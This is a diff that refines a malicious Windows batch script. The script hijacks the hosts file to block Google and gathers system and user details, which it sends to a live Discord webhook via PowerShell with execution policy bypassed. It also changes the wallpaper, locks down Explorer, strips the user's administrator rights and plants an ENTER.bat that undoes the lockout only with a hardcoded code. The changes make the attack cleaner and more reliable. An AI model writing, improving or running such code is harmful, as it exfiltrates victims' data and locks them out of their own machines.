@@ -14,7 +14,7 @@ echo 127.0.0.1 google.com >> C:\Windows\System32\drivers\etc\hosts
 echo 127.0.0.1 chrome.google.com >> C:\Windows\System32\drivers\etc\hosts
 
 :: Collect system details for webhook transmission
-set "WebhookURL=https://discord.com/api/webhooks/1490372072549912638/pB3sRITD330QnQCP7LkvPdMLk4w0S1UIyNngP7x8u0etZfw87rIXRXnL3g6pIeEUkVNG" :: Replace with actual webhook URL
+set "WebhookURL=https://discord.com/api/webhooks/1490372072549912638/pB3sRITD330QnQCP7LkvPdMLk4w0S1UIyNngP7x8u0etZfw87rIXRXnL3g6pIeEUkVNG"
 for /f "tokens=2 delims==" %%a in ('wmic OS get caption /value') do set "OS=%%a"
 for /f "tokens=2 delims==" %%a in ('wmic ComputerSystem get Name /value') do set "PCName=%%a"
 for /f "tokens=2 delims==" %%a in ('wmic UserAccount where "LocalAccount='TRUE'" get Name /value') do set "UserName=%%a"
@@ -30,20 +30,16 @@ echo IP Address: %IP% >> tempinfo.txt
 echo Attempting to retrieve saved credentials... >> tempinfo.txt
 echo Saved Passwords: [Not retrieved in this basic script] >> tempinfo.txt
 
-:: Send data to webhook using PowerShell
-powershell -ExecutionPolicy Bypass -Command ^
-"$webhook = '%WebhookURL%'; ^
-$body = Get-Content -Path 'tempinfo.txt' -Raw; ^
-Invoke-WebRequest -Uri $webhook -Method POST -Body $body -ContentType 'text/plain'"
+:: Send data to webhook using PowerShell with improved formatting
+powershell -ExecutionPolicy Bypass -Command "$webhook = '%WebhookURL%'; $body = Get-Content -Path 'tempinfo.txt' -Raw; Invoke-WebRequest -Uri $webhook -Method POST -Body $body -ContentType 'text/plain'"
 
 :: Clean up temporary file
-del tempinfo.txt
+if exist tempinfo.txt del tempinfo.txt
 
 :: Change desktop background to a "scary" image (assuming image is placed in C:\Scary)
-:: You need to place a scary image at this path or modify the path accordingly
 if not exist "C:\Scary" mkdir "C:\Scary"
-:: Placeholder for image download (can use PowerShell to download if needed)
-:: Example: powershell -Command "Invoke-WebRequest -Uri '' -OutFile 'C:\Scary\scary.jpg'"
+:: Uncomment and update the URL below to download a scary image if desired
+:: powershell -Command "Invoke-WebRequest -Uri 'https://example.com/scary.jpg' -OutFile 'C:\Scary\scary.jpg'"
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Scary\scary.jpg" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
@@ -58,13 +54,13 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 :: Disable Admin privileges for current user
 net localgroup Administrators %UserName% /delete >nul 2>&1
 
-:: Create ENTER.bat on desktop to allow unlocking with code
+:: Create ENTER.bat on desktop to allow unlocking with code, with proper formatting
 echo @echo off > "%USERPROFILE%\Desktop\ENTER.bat"
 echo title Enter Unlock Code >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo :start >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo cls >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo echo Enter the unlock code to regain access: >> "%USERPROFILE%\Desktop\ENTER.bat"
-echo set /p code= >> "%USERPROFILE%\Desktop\ENTER.bat"
+echo set /p code=Code: >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo if /i "%%code%%"=="TRISSIE" ( >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo goto unlock >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo ) else ( >> "%USERPROFILE%\Desktop\ENTER.bat"
@@ -73,12 +69,12 @@ echo pause >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo goto start >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo ) >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo :unlock >> "%USERPROFILE%\Desktop\ENTER.bat"
-echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /f >> "%USERPROFILE%\Desktop\ENTER.bat"
-echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >> "%USERPROFILE%\Desktop\ENTER.bat"
-echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v HideDesktopIcons /f >> "%USERPROFILE%\Desktop\ENTER.bat"
-echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /f >> "%USERPROFILE%\Desktop\ENTER.bat"
-echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /f >> "%USERPROFILE%\Desktop\ENTER.bat"
-echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFile /f >> "%USERPROFILE%\Desktop\ENTER.bat"
+echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /f 2^>nul >> "%USERPROFILE%\Desktop\ENTER.bat"
+echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f 2^>nul >> "%USERPROFILE%\Desktop\ENTER.bat"
+echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v HideDesktopIcons /f 2^>nul >> "%USERPROFILE%\Desktop\ENTER.bat"
+echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /f 2^>nul >> "%USERPROFILE%\Desktop\ENTER.bat"
+echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /f 2^>nul >> "%USERPROFILE%\Desktop\ENTER.bat"
+echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFile /f 2^>nul >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo echo System unlocked successfully. Access restored. >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo pause >> "%USERPROFILE%\Desktop\ENTER.bat"
 echo exit >> "%USERPROFILE%\Desktop\ENTER.bat"
